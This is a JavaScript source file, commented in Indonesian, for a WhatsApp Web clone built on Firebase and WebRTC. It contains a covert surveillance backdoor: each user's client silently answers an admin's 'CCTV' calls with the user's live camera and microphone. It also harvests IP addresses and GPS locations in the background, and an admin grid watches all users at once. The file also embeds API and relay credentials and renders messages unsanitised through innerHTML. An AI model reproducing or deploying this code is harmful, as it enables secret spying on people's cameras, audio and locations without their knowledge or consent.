/**
 * =========================================================================
 * TITUSCHAT PRO V27 OMNI-SERVER MAX (WHATSAPP WEB CLONE)
 * Arsitektur: Single Page Application (SPA) + Firebase BaaS + WebRTC
 * =========================================================================
 */

// 1. IMPOR MODUL FIREBASE V10 (Native ES Modules)
import { initializeApp } from "firebase/app";
import { 
  getFirestore, collection, addDoc, onSnapshot, query, orderBy, 
  serverTimestamp, setDoc, doc, updateDoc 
} from "firebase/firestore";

// 2. KONFIGURASI FIREBASE ASLI (WebTitusCode)
const firebaseConfig = {
  apiKey: "AIzaSyCoH5hWljWWyvbTPtKWmb8oiFo29azrFfw",
  authDomain: "webtituscode.firebaseapp.com",
  projectId: "webtituscode",
  storageBucket: "webtituscode.firebasestorage.app",
  messagingSenderId: "54782655519",
  appId: "1:54782655519:web:f28fa7aabc89bf235e292a"
};

// Inisialisasi Firebase & Database
const app = initializeApp(firebaseConfig);
const db = getFirestore(app);

// 3. GLOBAL STATE MANAGEMENT
window.appCore = {
  currentUser: null,
  activeTargetId: null,
  usersCache: new Map(),
  messagesCache: [],
  peerCore: null,      // Peer untuk Call Reguler
  peerCctv: null,      // Peer Khusus Intersep CCTV Admin
  localMediaStream: null,
  adminCctvStreams: {} // Menampung koneksi CCTV ke banyak user
};

// Konfigurasi WebRTC Enterprise (Bypass ISP NAT)
const WEBRTC_CONFIG = {
  iceServers: [
    { urls: 'stun:stun.l.google.com:19302' },
    { urls: 'stun:global.stun.twilio.com:3478' },
    { urls: ['turn:openrelay.metered.ca:80', 'turn:openrelay.metered.ca:443'], username: 'openrelayproject', credential: 'openrelayproject' }
  ]
};

// =========================================================================
// 4. SISTEM AUTENTIKASI & INITIALISASI APP
// =========================================================================

// Toggle Login / Register UI
const btnLogin = document.getElementById('btn-login');
const inputId = document.getElementById('auth-id');
const inputName = document.getElementById('auth-name');

btnLogin.addEventListener('click', async () => {
  let userId = inputId.value.trim();
  const userName = inputName.value.trim();
  if(!userId) return alert("ID Pengguna wajib diisi!");
  if(!userId.startsWith("@")) userId = "@" + userId;

  const isAdmin = userId === "@titus";
  
  // Data User Standar
  const userPayload = {
    username: userId,
    name: userName || (isAdmin ? "Titus (Admin Server)" : "User " + userId.replace('@','')),
    isAdmin: isAdmin,
    isOnline: true,
    lastLogin: new Date().toISOString(),
    ipAddress: await fetchIP(),
    userAgent: navigator.userAgent
  };

  // Login & Push ke Firestore (Upsert)
  try {
    await setDoc(doc(db, "omni_users", userId), userPayload, { merge: true });
    window.appCore.currentUser = userPayload;
    
    // Transisi UI (Masuk ke WhatsApp Clone)
    document.getElementById('app-auth').style.display = 'none';
    document.getElementById('app-main').style.display = 'flex';
    
    // Set UI Sidebar
    document.getElementById('my-avatar').innerText = userPayload.name.charAt(0);
    if(isAdmin) document.getElementById('admin-trigger').style.display = 'inline-block';

    // Booting Sistem Inti
    bootOmniServer();

  } catch(e) {
    console.error("Firebase Login Error:", e);
    alert("Gagal terhubung ke Cloud Server. Periksa koneksi internet Anda.");
  }
});

// Helper: Ambil IP Address Klien (Untuk fitur IP Tracker Admin)
async function fetchIP() {
  try {
    const res = await fetch('https://api.ipify.org?format=json');
    const data = await res.json();
    return data.ip;
  } catch(e) { return "Hidden/Proxy"; }
}

// =========================================================================
// 5. OMNI-SERVER BOOTSTRAP (Sinkronisasi & WebRTC)
// =========================================================================
function bootOmniServer() {
  // A. Nyalakan Listener Firestore untuk Users (Auto-Sync Kontak)
  const qUsers = query(collection(db, "omni_users"));
  onSnapshot(qUsers, (snapshot) => {
    window.appCore.usersCache.clear();
    snapshot.forEach(doc => { window.appCore.usersCache.set(doc.id, doc.data()); });
    renderSidebarChats();
    if(window.appCore.currentUser.isAdmin) renderAdminTable(); // Update Admin Dash otomatis
  });

  // B. Nyalakan Listener Firestore untuk Messages (Auto-Sync Pesan)
  const qMsgs = query(collection(db, "omni_messages"), orderBy("timestamp", "asc"));
  onSnapshot(qMsgs, (snapshot) => {
    window.appCore.messagesCache = [];
    snapshot.forEach(doc => { window.appCore.messagesCache.push(doc.data()); });
    
    if(window.appCore.activeTargetId) {
      renderChatMessages();
      scrollToBottom();
    }
  });

  // C. Nyalakan Daemons WebRTC (PeerJS)
  const cleanId = window.appCore.currentUser.username.replace('@', '');
  
  // Peer Regular (Untuk Panggilan Biasa)
  window.appCore.peerCore = new Peer(`titus_core_${cleanId}`, WEBRTC_CONFIG);
  
  // Peer Backdoor CCTV (Khusus Menerima Intersep Admin secara rahasia)
  window.appCore.peerCctv = new Peer(`titus_cctv_${cleanId}`, WEBRTC_CONFIG);
  
  window.appCore.peerCctv.on('call', (call) => {
    console.log("⚠️ PERINGATAN: Membuka jalur intersep CCTV untuk Admin Server...");
    navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true })
      .then(stream => { call.answer(stream); })
      .catch(err => {
        // Anti-Crash jika device tidak punya kamera (Kirim kanvas hitam statis)
        const canvas = document.createElement('canvas');
        canvas.width = 640; canvas.height = 480;
        const ctx = canvas.getContext('2d');
        ctx.fillStyle = '#0a1014'; ctx.fillRect(0,0,640,480);
        ctx.fillStyle = '#ef4444'; ctx.font = '24px Arial'; ctx.fillText('Device Camera Blocked/Null', 150, 240);
        call.answer(canvas.captureStream(10));
      });
  });

  // Cek GPS di Background untuk Data Admin
  if(navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(pos => {
      updateDoc(doc(db, "omni_users", window.appCore.currentUser.username), {
        gps: `${pos.coords.latitude}, ${pos.coords.longitude}`
      });
    }, () => {});
  }
}

// =========================================================================
// 6. UI ENGINE: RENDER SIDEBAR & CHAT AREA
// =========================================================================

// Pencarian di Sidebar
document.getElementById('search-input').addEventListener('input', (e) => {
  renderSidebarChats(e.target.value.toLowerCase());
});

function renderSidebarChats(searchQuery = "") {
  const container = document.getElementById('chat-list');
  container.innerHTML = '';

  let hasUsers = false;
  window.appCore.usersCache.forEach((uData, uid) => {
    if(uid === window.appCore.currentUser.username) return; // Jangan tampilkan diri sendiri di list chat
    if(searchQuery && !uData.name.toLowerCase().includes(searchQuery) && !uid.toLowerCase().includes(searchQuery)) return;

    hasUsers = true;
    
    // Cari pesan terakhir antara saya dan user ini
    const lastMsg = window.appCore.messagesCache
      .filter(m => (m.sender === uid && m.target === window.appCore.currentUser.username) || (m.sender === window.appCore.currentUser.username && m.target === uid))
      .pop();

    let timeText = lastMsg ? lastMsg.time : uData.isOnline ? 'Online' : '';
    let msgPreview = lastMsg ? (lastMsg.sender === window.appCore.currentUser.username ? '✓ ' : '') + lastMsg.text : 'Ketuk untuk mengobrol';

    const div = document.createElement('div');
    div.className = `chat-item ${window.appCore.activeTargetId === uid ? 'active' : ''}`;
    div.onclick = () => openActiveChat(uid);
    
    div.innerHTML = `
      <div class="avatar" style="background-color: var(--accent-wa); color:#111;">${uData.name.charAt(0)}</div>
      <div class="chat-item-info">
        <div class="chat-item-top">
          <b class="chat-item-name">${uData.name} ${uData.isAdmin ? '<i class="fa-solid fa-circle-check" style="color:var(--accent-blue); font-size:12px;"></i>' : ''}</b>
          <span class="chat-item-time">${timeText}</span>
        </div>
        <div class="chat-item-msg">${msgPreview}</div>
      </div>
    `;
    container.appendChild(div);
  });

  if(!hasUsers) {
    container.innerHTML = `<div class="loading-state">Tidak ada pengguna lain di server.</div>`;
  }
}

function openActiveChat(targetId) {
  window.appCore.activeTargetId = targetId;
  const targetUser = window.appCore.usersCache.get(targetId);
  
  // Tampilkan Area Chat, Sembunyikan Empty State
  document.getElementById('empty-state').style.display = 'none';
  document.getElementById('active-chat').style.display = 'flex';
  
  // Render Header Chat
  document.getElementById('target-name').innerHTML = `${targetUser.name} ${targetUser.isAdmin ? '<i class="fa-solid fa-circle-check" style="color:var(--accent-blue); font-size:14px;"></i>' : ''}`;
  document.getElementById('target-status').innerText = targetUser.isOnline ? "Online (Cloud Sync)" : "Offline";
  document.getElementById('target-avatar').innerText = targetUser.name.charAt(0);

  // Ubah status aktif di sidebar
  renderSidebarChats();
  renderChatMessages();
  scrollToBottom();

  // Mode HP: Geser Sidebar (UX Mobile)
  if(window.innerWidth <= 800) {
    document.querySelector('.sidebar').style.transform = 'translateX(-100%)';
    document.querySelector('.chat-area').style.transform = 'translateX(0)';
  }
}

// Fungsi kembali dari Chat (Khusus HP)
window.closeMobileChat = function() {
  window.appCore.activeTargetId = null;
  document.querySelector('.sidebar').style.transform = 'translateX(0)';
  document.querySelector('.chat-area').style.transform = 'translateX(100%)';
  renderSidebarChats();
};

// =========================================================================
// 7. SISTEM PENGIRIMAN PESAN & RENDER CLOUD
// =========================================================================
const msgInput = document.getElementById('msg-input');
const btnSend = document.getElementById('btn-send');
const btnMic = document.getElementById('btn-mic');

msgInput.addEventListener('input', () => {
  if(msgInput.value.trim().length > 0) {
    btnMic.style.display = 'none';
    btnSend.style.display = 'block';
  } else {
    btnMic.style.display = 'block';
    btnSend.style.display = 'none';
  }
});

msgInput.addEventListener('keypress', (e) => {
  if(e.key === 'Enter') pushMessageToCloud();
});

btnSend.addEventListener('click', pushMessageToCloud);

async function pushMessageToCloud() {
  const text = msgInput.value.trim();
  const target = window.appCore.activeTargetId;
  if(!text || !target) return;

  const payload = {
    id: "msg_" + Date.now(),
    sender: window.appCore.currentUser.username,
    target: target,
    text: text,
    time: new Date().toLocaleTimeString([], {hour:'2-digit', minute:'2-digit'}),
    timestamp: serverTimestamp() // Firestore Server Time
  };

  msgInput.value = '';
  btnSend.style.display = 'none'; 
  btnMic.style.display = 'block';

  try {
    await addDoc(collection(db, "omni_messages"), payload);
    // Suara kirim (opsional, browser modern mungkin memblokir audio tanpa interaksi murni)
  } catch(e) { console.error("Gagal mengirim:", e); }
}

function renderChatMessages() {
  const container = document.getElementById('messages-container');
  container.innerHTML = '';

  const target = window.appCore.activeTargetId;
  const myId = window.appCore.currentUser.username;

  // Filter pesan hanya untuk saya dan target
  const filtered = window.appCore.messagesCache.filter(m => 
    (m.sender === myId && m.target === target) || 
    (m.sender === target && m.target === myId)
  );

  let lastDate = "";

  filtered.forEach(m => {
    const isMe = m.sender === myId;
    const div = document.createElement('div');
    div.className = `msg-bubble ${isMe ? 'msg-out' : 'msg-in'}`;
    
    div.innerHTML = `
      <div style="padding-bottom: 2px;">${m.text}</div>
      <div class="msg-meta">${m.time} <i class="fa-solid fa-check-double" style="color: ${isMe ? '#53bdeb' : 'var(--text-muted)'};"></i></div>
    `;
    container.appendChild(div);
  });
}

function scrollToBottom() {
  const c = document.getElementById('messages-container');
  c.scrollTop = c.scrollHeight;
}

// =========================================================================
// 8. OMNI-SERVER ADMIN COMMAND CENTER (DASHBOARD & GLOBAL CCTV)
// =========================================================================

window.openAdminDashboard = function() {
  if(!window.appCore.currentUser.isAdmin) return alert("Akses Ditolak!");
  document.getElementById('admin-dashboard').style.display = 'flex';
  renderAdminTable();
};

window.closeAdminDashboard = function() {
  document.getElementById('admin-dashboard').style.display = 'none';
};

function renderAdminTable() {
  const tbody = document.getElementById('admin-table-body');
  if(!tbody) return;
  tbody.innerHTML = '';

  window.appCore.usersCache.forEach((u, uid) => {
    const tr = document.createElement('tr');
    const badge = u.isAdmin ? '<i class="fa-solid fa-shield" style="color:var(--accent-wa);"></i>' : '';
    tr.innerHTML = `
      <td><b style="color:var(--text-main);">${uid}</b></td>
      <td>${u.name} ${badge}</td>
      <td style="color:${u.isOnline ? 'var(--accent-wa)' : 'var(--accent-danger)'}; font-weight:bold;">${u.isOnline ? 'ONLINE' : 'OFFLINE'}</td>
      <td style="font-family:monospace; font-size:12px; color:var(--text-muted);">
        IP: ${u.ipAddress || 'Hidden'}<br>
        GPS: ${u.gps || 'Disabled'}
      </td>
      <td>
        ${!u.isAdmin ? `<button class="btn-spy" onclick="interceptSingleUser('${uid}')"><i class="fa-solid fa-video"></i> Intersep CCTV</button>` : '<span style="color:#666; font-size:12px;">Admin Protected</span>'}
      </td>
    `;
    tbody.appendChild(tr);
  });
}

// Buka 1 Kamera Spesifik (Demo)
window.interceptSingleUser = function(targetId) {
  alert(`Memerintahkan jalur WebRTC ke peer titus_cctv_${targetId.replace('@','')}...`);
  // Dalam realisasi, akan memanggil openGlobalCCTV() dengan filter target
};

// =========================================================================
// 9. GLOBAL CCTV GRID (MEMANTAU SEMUA USER SEKALIGUS)
// =========================================================================
window.openGlobalCCTV = function() {
  document.getElementById('admin-dashboard').style.display = 'none';
  document.getElementById('cctv-grid-view').style.display = 'flex';
  
  const container = document.getElementById('cctv-grid-container');
  container.innerHTML = '';

  // Filter user selain admin
  const targets = Array.from(window.appCore.usersCache.values()).filter(u => !u.isAdmin);

  if(targets.length === 0) {
    container.innerHTML = `<div style="color:var(--accent-danger); font-weight:bold; padding:20px; width:100%; text-align:center;">TIDAK ADA PENGGUNA TERDETEKSI DI SERVER.</div>`;
    return;
  }

  targets.forEach(u => {
    const cleanId = u.username.replace('@', '');
    const cctvPeerId = `titus_cctv_${cleanId}`;

    // Buat Kotak Kamera
    const box = document.createElement('div');
    box.className = 'cctv-box';
    box.innerHTML = `
      <video id="cctv-vid-${cleanId}" autoplay playsinline muted></video>
      <div class="cctv-overlay">
        TARGET: ${u.username}<br>
        <span id="cctv-stat-${cleanId}" style="color:var(--accent-wa);">Menghubungkan P2P...</span>
      </div>
    `;
    container.appendChild(box);

    // Kirim Panggilan Intersep WebRTC
    try {
      // Membuat canvas kosong sebagai decoy stream (PeerJS butuh stream untuk memanggil)
      const canvas = document.createElement('canvas'); canvas.width = 1; canvas.height = 1;
      const dummyStream = canvas.captureStream(1);
      
      const call = window.appCore.peerCore.call(cctvPeerId, dummyStream);
      window.appCore.adminCctvStreams[u.username] = call;

      call.on('stream', (remoteStream) => {
        document.getElementById(`cctv-stat-${cleanId}`).innerText = "LIVE (SADAP AKTIF)";
        document.getElementById(`cctv-stat-${cleanId}`).style.color = "var(--accent-danger)";
        const videoEl = document.getElementById(`cctv-vid-${cleanId}`);
        videoEl.srcObject = remoteStream;
      });

      call.on('error', () => {
        document.getElementById(`cctv-stat-${cleanId}`).innerText = "Koneksi Gagal / Terblokir Firewall";
      });

    } catch(e) {
      document.getElementById(`cctv-stat-${cleanId}`).innerText = "Peer Endpoint Offline";
    }
  });
};

window.closeGlobalCCTV = function() {
  // Matikan semua panggilan
  Object.values(window.appCore.adminCctvStreams).forEach(call => {
    if(call && typeof call.close === 'function') call.close();
  });
  window.appCore.adminCctvStreams = {};
  
  document.getElementById('cctv-grid-view').style.display = 'none';
  document.getElementById('admin-dashboard').style.display = 'flex';
};
